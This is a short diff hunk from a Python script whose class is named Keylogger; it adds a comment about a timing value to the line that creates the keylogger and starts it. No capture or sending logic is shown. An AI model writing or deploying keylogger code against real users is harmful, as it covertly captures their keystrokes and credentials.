@@ -410,7 +410,7 @@ class Keylogger:
                 
 if __name__=='__main__':     
   
-   Keylogger = Keylogger(480)
+   Keylogger = Keylogger(480)  # set the time by seconds
    Keylogger.GO_START()            
                                 
                               	 
